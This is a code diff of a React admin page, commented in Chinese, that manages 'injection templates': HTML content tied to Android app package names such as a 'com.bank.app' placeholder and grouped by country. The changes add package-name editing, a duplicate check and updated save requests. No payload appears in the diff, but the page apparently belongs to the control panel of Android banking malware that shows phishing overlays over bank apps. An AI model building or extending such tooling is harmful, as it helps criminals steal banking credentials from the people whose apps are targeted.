@@ -39,7 +39,7 @@ export default function InjPage() {
   const [selectedCountry, setSelectedCountry] = useState(null) // 卡片式国家选项卡
 
   /* 编辑/预览模态框状态 */
-  const emptyEditModal = { open: false, id: null, name: '', country: '', content: '', showPreview: true }
+  const emptyEditModal = { open: false, id: null, templateId: '', originalTemplateId: '', name: '', packageName: '', originalPackageName: '', country: '', content: '', showPreview: true }
   const [editModal, setEditModal] = useState(emptyEditModal)
   const [previewModal, setPreviewModal] = useState({ open: false, id: null, name: '', content: '' })
   const [saving, setSaving] = useState(false)
@@ -169,11 +169,18 @@ export default function InjPage() {
       const r = await api.request(url)
       console.log('[InjPage] openEdit 接口返回：r=', r)
       const content = forceGetHtml(r)
+      const detail = r?.data || {}
+      const latestPackageName = detail.packageName || detail.package_name || pkg
+      const latestTemplateId = detail.templateId || detail.template_id || tplId || keyStr
       console.log('[InjPage] openEdit 解析得到 content 长度=', content.length, '前100字=', content.substring(0, 100))
       setEditModal({
         open: true,
-        id: keyStr,
+        id: latestTemplateId || latestPackageName || keyStr,
+        templateId: latestTemplateId || '',
+        originalTemplateId: latestTemplateId || '',
         name: tpl.name,
+        packageName: latestPackageName || '',
+        originalPackageName: latestPackageName || '',
         country: (tpl.country && tpl.country.trim()) || '其他',
         content: content,
         showPreview: true,
@@ -186,12 +193,27 @@ export default function InjPage() {
 
   /* 保存编辑：双保险 — 优先用 PUT /api/injection/template (body 内带 id/packageName/htmlContent，无路径参数，不匹配错路由) */
   const saveEdit = async () => {
+    const nextPackageName = (editModal.packageName || '').trim()
+    if (!nextPackageName) {
+      alert('包名不能为空')
+      return
+    }
+    const duplicated = templates.some(t => {
+      const pkg = (t.packageName || t.package_name || '').trim().toLowerCase()
+      const currentPkg = (editModal.originalPackageName || '').trim().toLowerCase()
+      return pkg && pkg === nextPackageName.toLowerCase() && pkg !== currentPkg
+    })
+    if (duplicated) {
+      alert('包名已存在，不能重复')
+      return
+    }
     setSaving(true)
     try {
       const body = {
-        id: editModal.id,
-        templateId: editModal.id,
-        packageName: editModal.id,
+        id: editModal.originalTemplateId || editModal.templateId || editModal.id,
+        templateId: editModal.originalTemplateId || editModal.templateId || editModal.id,
+        originalPackageName: editModal.originalPackageName,
+        packageName: nextPackageName,
         country: editModal.country || '其他',
         htmlContent: editModal.content,
         html_content: editModal.content,
@@ -210,7 +232,7 @@ export default function InjPage() {
         console.warn('[InjPage] saveEdit PUT /template 失败，回退 path 方式:', e.message)
         resp = await api.request(`/api/injection/templates/${encodeURIComponent(editModal.id)}`, {
           method: 'PUT',
-          body: JSON.stringify({ htmlContent: editModal.content }),
+          body: JSON.stringify({ htmlContent: editModal.content, packageName: nextPackageName, originalPackageName: editModal.originalPackageName }),
           headers: { 'Content-Type': 'application/json' }
         })
       }
@@ -505,16 +527,28 @@ export default function InjPage() {
             padding: 24, width: '95%', maxWidth: 1100, maxHeight: '90vh', display: 'flex', flexDirection: 'column', gap: 12
           }} onClick={e => e.stopPropagation()}>
             <h4 style={{ margin: 0, color: '#e0d0f0', fontSize: 16 }}>✏️ 编辑模板: {editModal.name}</h4>
-            <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
-              <label style={{ fontSize: 12, color: '#8b7aaa' }}>国家/地区</label>
-              <input
-                type="text"
-                list="inj-country-options"
-                value={editModal.country}
-                onChange={e => setEditModal(prev => ({ ...prev, country: e.target.value }))}
-                placeholder="例：秘鲁"
-                style={{ width: 220, padding: '7px 10px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 12, outline: 'none' }}
-              />
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 220px', gap: 10, alignItems: 'end' }}>
+              <label style={{ fontSize: 12, color: '#8b7aaa', display: 'flex', flexDirection: 'column', gap: 6 }}>
+                包名 *
+                <input
+                  type="text"
+                  value={editModal.packageName}
+                  onChange={e => setEditModal(prev => ({ ...prev, packageName: e.target.value }))}
+                  placeholder="例：com.bank.app"
+                  style={{ width: '100%', padding: '7px 10px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 12, outline: 'none' }}
+                />
+              </label>
+              <label style={{ fontSize: 12, color: '#8b7aaa', display: 'flex', flexDirection: 'column', gap: 6 }}>
+                国家/地区
+                <input
+                  type="text"
+                  list="inj-country-options"
+                  value={editModal.country}
+                  onChange={e => setEditModal(prev => ({ ...prev, country: e.target.value }))}
+                  placeholder="例：秘鲁"
+                  style={{ width: '100%', padding: '7px 10px', borderRadius: 6, border: '1px solid rgba(168,85,247,.2)', background: 'rgba(0,0,0,.3)', color: '#d0c0e0', fontSize: 12, outline: 'none' }}
+                />
+              </label>
             </div>
             <div style={{ display: 'flex', gap: 12, flex: 1, minHeight: 0 }}>
               <textarea
